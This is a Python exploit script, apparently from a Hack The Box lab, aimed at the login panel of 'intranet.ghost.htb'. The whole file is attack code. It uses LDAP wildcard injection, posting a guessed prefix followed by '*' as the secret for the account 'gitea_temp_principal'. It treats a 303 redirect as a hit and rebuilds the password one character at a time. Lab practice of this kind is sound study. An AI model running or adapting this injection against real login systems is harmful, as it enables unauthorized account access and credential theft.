#!/usr/bin/env python3
#To use for bruteforcing the login on the panel.


import string
import requests

url = 'http://intranet.ghost.htb:8008/login'

headers = {
    'Host': 'intranet.ghost.htb:8008',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Next-Action': 'c471eb076ccac91d6f828b671795550fd5925940',
    'Connection': 'keep-alive'
}

passw = ""  # Start with an empty password
while True:
    found_char = False
    for char in string.ascii_lowercase + string.digits:  # Iterate through a-z and 0-9
        files = {
            '1_ldap-username': (None, 'gitea_temp_principal'),
            '1_ldap-secret': (None, f'{passw}{char}*'),  # Try appending each char
            '0': (None, '[{},"$K1"]')
        }
        res = requests.post(url, headers=headers, files=files)
        if res.status_code == 303:  # If the response indicates success
            passw += char  # Append the successful character to the password
            print(f"Password so far: {passw}")
            found_char = True
            break  # Break out of the for loop to continue building the password
    if not found_char:  # If no character matched, the brute-forcing is done
        break

print(f"Final Password: {passw}")
